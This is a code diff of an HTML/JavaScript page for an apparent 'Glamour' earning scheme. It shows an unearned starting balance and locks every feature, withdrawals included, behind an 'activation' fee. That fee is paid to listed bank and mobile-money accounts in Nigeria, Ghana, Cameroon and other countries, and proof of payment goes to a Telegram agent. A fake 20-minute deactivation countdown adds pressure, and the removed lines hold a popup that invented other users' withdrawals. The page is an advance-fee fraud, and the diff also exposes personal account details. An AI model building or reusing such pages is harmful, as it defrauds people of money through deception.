@@ -93,22 +93,6 @@
             background: linear-gradient(135deg, #f5e050 0%, #d4af37 100%);
             color: #000; font-weight: 800;
         }
-
-        /* ACTIVITY POPUP STYLES */
-        #activityToast {
-            position: fixed; bottom: 100px; left: 20px;
-            background: rgba(15, 15, 15, 0.95);
-            border: 1px solid rgba(212, 175, 55, 0.3);
-            padding: 10px 15px; border-radius: 18px;
-            display: flex; align-items: center; gap: 12px;
-            z-index: 3000; transform: translateY(200%);
-            transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-            pointer-events: none;
-            min-width: 220px;
-            backdrop-filter: blur(10px);
-        }
-        #activityToast.show { transform: translateY(0); }
     </style>
 </head>
 <body>
@@ -133,13 +117,13 @@
                     <span id="expiryBadge" class="bg-red-500/10 text-red-500 text-[7px] px-2 py-1 rounded border border-red-500/20 font-bold uppercase tracking-tighter">De-activating: 20:00</span>
                 </div>
             </div>
-            <div class="text-5xl font-extrabold tracking-tighter italic" id="mainBalance">₦0</div>
+            <div class="text-5xl font-extrabold tracking-tighter italic" id="mainBalance">₦14,000</div>
             
             <div class="mt-10 grid grid-cols-2 gap-4">
                 <button onclick="openActivation()" class="activate-gradient py-4 rounded-2xl text-[10px] uppercase tracking-widest shadow-xl active:scale-95 transition-transform">
                     Activate Account
                 </button>
-                <button onclick="handleAction('Withdrawals')" class="bg-white/5 border border-white/10 py-4 rounded-2xl text-[10px] uppercase tracking-widest font-bold active:scale-95 transition-transform">
+                <button onclick="showProceed('Withdrawal Portal')" class="bg-white/5 border border-white/10 py-4 rounded-2xl text-[10px] uppercase tracking-widest font-bold active:scale-95 transition-transform">
                     Withdraw
                 </button>
             </div>
@@ -170,7 +154,7 @@
         </div>
         
         <div class="space-y-3">
-            <div onclick="handleAction('Lifestyle')" class="feature-card p-5 flex items-center gap-4">
+            <div onclick="showProceed('Lifestyle Monetization')" class="feature-card p-5 flex items-center gap-4">
                 <div class="icon-box"><i class="fas fa-star"></i></div>
                 <div class="flex-1">
                     <h4 class="text-sm font-bold">Lifestyle Monetization</h4>
@@ -178,7 +162,7 @@
                 </div>
                 <i class="fas fa-lock text-zinc-800 text-xs"></i>
             </div>
-            <div onclick="handleAction('Face-Time')" class="feature-card p-5 flex items-center gap-4">
+            <div onclick="showProceed('Elite Face-Time')" class="feature-card p-5 flex items-center gap-4">
                 <div class="icon-box"><i class="fas fa-video"></i></div>
                 <div class="flex-1">
                     <h4 class="text-sm font-bold">Elite Face-Time</h4>
@@ -186,7 +170,7 @@
                 </div>
                 <i class="fas fa-lock text-zinc-800 text-xs"></i>
             </div>
-            <div onclick="handleAction('Dark Mode')" class="feature-card p-5 flex items-center gap-4">
+            <div onclick="showProceed('Dark Mode Cycles')" class="feature-card p-5 flex items-center gap-4">
                 <div class="icon-box"><i class="fas fa-moon"></i></div>
                 <div class="flex-1">
                     <h4 class="text-sm font-bold">Dark Mode Cycles</h4>
@@ -194,7 +178,7 @@
                 </div>
                 <i class="fas fa-lock text-zinc-800 text-xs"></i>
             </div>
-            <div onclick="handleAction('Scripting')" class="feature-card p-5 flex items-center gap-4">
+            <div onclick="showProceed('Script-2-Cash')" class="feature-card p-5 flex items-center gap-4">
                 <div class="icon-box"><i class="fas fa-pen-nib"></i></div>
                 <div class="flex-1">
                     <h4 class="text-sm font-bold">Script-2-Cash</h4>
@@ -202,7 +186,7 @@
                 </div>
                 <i class="fas fa-lock text-zinc-800 text-xs"></i>
             </div>
-            <div onclick="handleAction('Lingua')" class="feature-card p-5 flex items-center gap-4">
+            <div onclick="showProceed('Glam Lingua')" class="feature-card p-5 flex items-center gap-4">
                 <div class="icon-box"><i class="fas fa-globe"></i></div>
                 <div class="flex-1">
                     <h4 class="text-sm font-bold">Glam Lingua</h4>
@@ -213,70 +197,51 @@
         </div>
     </div>
 
-    <div class="px-6 mb-10">
-        <button onclick="contactSupport()" class="w-full bg-zinc-900 py-6 rounded-[24px] text-[10px] font-black uppercase tracking-[0.2em] border border-zinc-800 text-zinc-400 active:scale-95 transition-transform">
-            Elite Support
-        </button>
-    </div>
-
-    <div id="activityToast">
-        <div class="w-10 h-10 rounded-full bg-zinc-900 flex items-center justify-center border border-yellow-500/30">
-            <i id="toastIcon" class="fas fa-check-circle text-yellow-500"></i>
-        </div>
-        <div class="flex flex-col">
-            <span id="toastUser" class="text-[10px] font-black text-white italic uppercase tracking-tight">User123</span>
-            <span id="toastAction" class="text-[9px] font-bold gold-text uppercase">Just Activated</span>
-            <span id="toastLoc" class="text-[7px] font-bold text-zinc-600 uppercase">From Nigeria</span>
-        </div>
-    </div>
-
     <div class="nav-blur fixed bottom-0 left-0 w-full flex justify-around items-center py-6 px-4 z-50">
         <div class="flex flex-col items-center gap-1.5 gold-text">
             <i class="fas fa-house-chimney text-xl"></i>
             <span class="text-[8px] font-black uppercase tracking-widest">Home</span>
         </div>
-        <div onclick="handleAction('Glam Works')" class="flex flex-col items-center gap-1.5 text-zinc-700 active:text-zinc-400 transition-colors">
+        <div onclick="showProceed('Glam Works')" class="flex flex-col items-center gap-1.5 text-zinc-700 active:text-zinc-400 transition-colors">
             <i class="fas fa-briefcase text-xl"></i>
             <span class="text-[8px] font-black uppercase tracking-widest">Glam Works</span>
         </div>
-        <div onclick="handleAction('Profile Settings')" class="flex flex-col items-center gap-1.5 text-zinc-700 active:text-zinc-400 transition-colors">
+        <div onclick="showProceed('Profile Settings')" class="flex flex-col items-center gap-1.5 text-zinc-700 active:text-zinc-400 transition-colors">
             <i class="fas fa-user-circle text-xl"></i>
             <span class="text-[8px] font-black uppercase tracking-widest">Profile</span>
         </div>
     </div>
 
+    <div id="proceedPopup" class="popup-overlay">
+        <div class="bg-zinc-950 border border-zinc-900 rounded-[45px] w-full max-w-sm p-8 text-center">
+            <h2 class="text-white text-xl font-black uppercase mb-4" id="proceedTitle">Locked</h2>
+            <p class="text-zinc-500 text-[10px] font-bold uppercase tracking-widest mb-10 leading-relaxed">
+                You must activate your account to access this professional earning module. 
+            </p>
+            <button onclick="openActivation()" class="activate-gradient w-full py-5 rounded-[22px] text-[11px] uppercase tracking-widest shadow-2xl active:scale-95 mb-4">
+                PROCEED TO ACTIVATE
+            </button>
+            <button onclick="closeProceed()" class="text-[10px] font-black text-zinc-700 uppercase tracking-widest block w-full">Cancel</button>
+        </div>
+    </div>
+
     <div id="activationPopup" class="popup-overlay">
         <div class="bg-zinc-950 border border-zinc-900 rounded-[45px] w-full max-w-sm p-8 text-center relative overflow-hidden">
-            <div class="w-12 h-1.5 bg-zinc-800 rounded-full mx-auto mb-8"></div>
-            
             <div id="paymentInitial">
                 <h2 class="gold-text text-xl font-black italic mb-2 uppercase">Elite Activation</h2>
                 <p id="feeLabel" class="text-zinc-500 text-[10px] font-black uppercase tracking-widest mb-10">Syncing fee...</p>
-                
                 <div class="bg-black border border-zinc-900 rounded-3xl p-6 mb-8 text-left space-y-6" id="bankDetails"></div>
-
-                <div class="bg-red-900/10 border border-red-900/20 p-4 rounded-2xl mb-8">
-                    <p class="text-[8px] text-red-700 font-bold uppercase leading-tight">Do Not Use OPAY for payment.</p>
-                </div>
-
                 <button onclick="startVerification()" class="activate-gradient w-full py-5 rounded-[22px] text-[11px] uppercase tracking-widest shadow-2xl active:scale-95">
                     I HAVE MADE PAYMENT
                 </button>
             </div>
-
             <div id="paymentVerifying" class="hidden py-4">
-                <div class="mb-6 flex justify-center">
-                    <div class="w-12 h-12 border-4 border-zinc-800 border-t-yellow-500 rounded-full animate-spin"></div>
-                </div>
-                <h3 class="text-white font-black italic uppercase text-lg mb-2">Almost Done</h3>
-                <p class="text-zinc-500 text-[9px] uppercase font-bold mb-10">Submit receipt to our verification agent</p>
-                
-                <button onclick="sendProof()" class="w-full bg-[#229ED9]/10 border border-[#229ED9]/30 py-5 rounded-2xl flex items-center justify-center gap-3 active:scale-95 transition-transform">
+                <h3 class="text-white font-black italic uppercase text-lg mb-2 text-center">Almost Done</h3>
+                <button onclick="sendProof()" class="w-full bg-[#229ED9]/10 border border-[#229ED9]/30 py-5 rounded-2xl flex items-center justify-center gap-3 mt-8">
                     <i class="fab fa-telegram text-[#229ED9] text-xl"></i>
-                    <span class="text-[10px] font-black uppercase text-white tracking-widest">Submit to Telegram Agent</span>
+                    <span class="text-[10px] font-black uppercase text-white tracking-widest">Submit to Agent</span>
                 </button>
             </div>
-
             <button onclick="closeActivation()" class="text-[10px] font-black text-zinc-700 uppercase tracking-widest mt-8 block w-full">Go Back</button>
         </div>
     </div>
@@ -302,9 +267,12 @@
 
         let liveSettings = {
             tgLink: "GLAMOUROFFICIAL_2",
-            ngBank: "PALMPAY", ngAcc: "9013801817", ngName: "Yetunde kolawole Esther",
-            ghBank: "MTN Momo", ghAcc: "0247637488", ghName: "Priscilla D. Gyamfi",
-            cmBank: "MTN Mobile", cmAcc: "680545817", cmName: "Chanceline Nwana"
+            ngBank: "KUDA", ngAcc: "93003738174", ngName: "BERRY MEDIA ENTERPRISE III — GLAMOUR WEBSITE",
+            ghBank: "MTN Momo", ghAcc: "XXXXXXXXX", ghName: "Agent Name",
+            cmBank: "MTN Mobile", cmAcc: "XXXXXXXXX", cmName: "Agent Name",
+            ugBank: "MTN/Airtel", ugAcc: "07XXXXXXXX", ugName: "Agent Name",
+            saBank: "Capitec/Standard", saAcc: "XXXXXXXXX", saName: "Agent Name",
+            keBank: "M-Pesa", keAcc: "07XXXXXXXX", keName: "Agent Name"
         };
 
         const settingsDocRef = doc(db, 'admin', 'settings');
@@ -325,57 +293,36 @@
 
         function syncUI(userData) {
             const country = userData.country || "Nigeria";
-            let symbol = "₦", bank, acc, name, fee;
+            let symbol = "₦", bank, acc, name, fee, bonus;
 
-            if(country === "Ghana") { symbol = "GHS "; bank = liveSettings.ghBank; acc = liveSettings.ghAcc; name = liveSettings.ghName; fee = "220 GHS"; }
-            else if(country === "Cameroon") { symbol = "XAF "; bank = liveSettings.cmBank; acc = liveSettings.cmAcc; name = liveSettings.cmName; fee = "13,000 XAF"; }
-            else { symbol = "₦"; bank = liveSettings.ngBank; acc = liveSettings.ngAcc; name = liveSettings.ngName; fee = "₦14,000"; }
+            switch(country) {
+                case "Ghana": symbol = "GHS "; bank = liveSettings.ghBank; acc = liveSettings.ghAcc; name = liveSettings.ghName; fee = "220 GHS"; bonus = 220; break;
+                case "Cameroon": symbol = "XAF "; bank = liveSettings.cmBank; acc = liveSettings.cmAcc; name = liveSettings.cmName; fee = "13,000 XAF"; bonus = 13000; break;
+                case "Uganda": symbol = "UGX "; bank = liveSettings.ugBank; acc = liveSettings.ugAcc; name = liveSettings.ugName; fee = "85,000 UGX"; bonus = 85000; break;
+                case "South Africa": symbol = "R "; bank = liveSettings.saBank; acc = liveSettings.saAcc; name = liveSettings.saName; fee = "450 ZAR"; bonus = 450; break;
+                case "Kenya": symbol = "KSh "; bank = liveSettings.keBank; acc = liveSettings.keAcc; name = liveSettings.keName; fee = "2,800 KES"; bonus = 2800; break;
+                default: symbol = "₦"; bank = liveSettings.ngBank; acc = liveSettings.ngAcc; name = liveSettings.ngName; fee = "₦14,000"; bonus = 14000;
+            }
 
-            document.getElementById('mainBalance').innerText = symbol + (userData.balance || 0).toLocaleString();
+            const currentBal = (userData.balance || 0) === 0 ? bonus : userData.balance;
+            document.getElementById('mainBalance').innerText = symbol + currentBal.toLocaleString();
             document.getElementById('indirectIncome').innerText = symbol + (userData.indirectEarnings || 0).toLocaleString();
             document.getElementById('countryDisplay').innerText = country.toUpperCase() + " REGION";
             document.getElementById('feeLabel').innerText = "Activation: " + fee;
-            
             document.getElementById('bankDetails').innerHTML = `
-                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Bank</p><p class="text-xs font-bold text-white uppercase">${bank}</p></div>
-                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account No</p><p class="text-xl font-black gold-text tracking-widest">${acc}</p></div>
-                <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account Name</p><p class="text-xs font-bold text-white italic uppercase">${name}</p></div>
+                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Method</p><p class="text-xs font-bold text-white uppercase">${bank}</p></div>
+                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account No</p><p class="text-xl font-black gold-text">${acc}</p></div>
+                <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Name</p><p class="text-xs font-bold text-white uppercase">${name}</p></div>
             `;
         }
 
-        // --- ACTIVITY POPUP SYSTEM ---
-        const names = ["Miracle", "Kofi", "Abebe", "Chima", "Fatima", "Zainab", "Okon", "Sade", "Tunde", "Kwame", "Amara", "Eze", "Musa"];
-        const countries = ["Nigeria", "Ghana", "South Africa", "Kenya", "Egypt", "Ethiopia", "Tanzania", "Uganda", "Algeria", "Morocco", "Angola", "Ivory Coast", "Cameroon", "Senegal", "Zimbabwe", "Zambia", "United Kingdom", "United States", "Canada", "Germany", "France", "Italy"];
-        const actions = ["Just Activated Elite", "Withdrew ₦45,000", "Just Registered", "Withdrew ₦120,000", "Upgraded Account", "Earned ₦15,000 Referral"];
-
-        function showActivity() {
-            const toast = document.getElementById('activityToast');
-            const randUser = names[Math.floor(Math.random() * names.length)] + "..." + Math.floor(Math.random()*99);
-            const randLoc = countries[Math.floor(Math.random() * countries.length)];
-            const randAction = actions[Math.floor(Math.random() * actions.length)];
-            
-            document.getElementById('toastUser').innerText = "@" + randUser;
-            document.getElementById('toastLoc').innerText = "From " + randLoc;
-            document.getElementById('toastAction').innerText = randAction;
-            document.getElementById('toastIcon').className = randAction.includes('Withdrew') ? "fas fa-arrow-up-right-from-square text-green-500" : "fas fa-check-circle text-yellow-500";
-
-            toast.classList.add('show');
-            setTimeout(() => { toast.classList.remove('show'); }, 4000);
-        }
-        setInterval(showActivity, 8000);
-
-        function startTimer(duration) {
-            let timer = duration, minutes, seconds;
-            const display = document.getElementById('expiryBadge');
-            const countdown = setInterval(() => {
-                minutes = parseInt(timer / 60, 10); seconds = parseInt(timer % 60, 10);
-                display.innerText = "De-activating: " + (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
-                if (--timer < 0) { clearInterval(countdown); display.innerText = "EXPIRED"; }
-            }, 1000);
-        }
-        window.onload = () => { startTimer(1200); showActivity(); };
-
+        window.showProceed = (title) => {
+            document.getElementById('proceedTitle').innerText = title;
+            document.getElementById('proceedPopup').style.display = 'flex';
+        };
+        window.closeProceed = () => document.getElementById('proceedPopup').style.display = 'none';
         window.openActivation = () => {
+            closeProceed();
             document.getElementById('paymentInitial').classList.remove('hidden');
             document.getElementById('paymentVerifying').classList.add('hidden');
             document.getElementById('activationPopup').style.display = 'flex';
@@ -387,11 +334,37 @@
         };
         window.sendProof = () => {
             const handle = liveSettings.tgLink.replace('@', '');
-            const msg = `Hello Admin, I have paid my activation fee.\n\nUsername: @${currentUsername}\nRequest: Elite Status Verification`;
+            const msg = `Hello Admin, I have paid my activation fee.\n\nUsername: @${currentUsername}`;
             window.open(`https://t.me/${handle}?text=${encodeURIComponent(msg)}`);
         };
-        window.contactSupport = () => { window.open(`https://t.me/${liveSettings.tgLink.replace('@', '')}`); };
-        window.handleAction = () => { openActivation(); };
+
+        // --- TIMER LOGIC ---
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.getElementById('expiryBadge');
+            
+            const countdownInterval = setInterval(() => {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = "De-activating: " + minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    display.textContent = "DE-ACTIVATED";
+                    display.classList.remove('text-red-500');
+                    display.classList.add('text-zinc-600');
+                }
+            }, 1000);
+        }
+
+        window.onload = () => {
+            // Set for 20 minutes (1200 seconds)
+            startTimer(1200);
+        };
     </script>
 </body>
 </html>
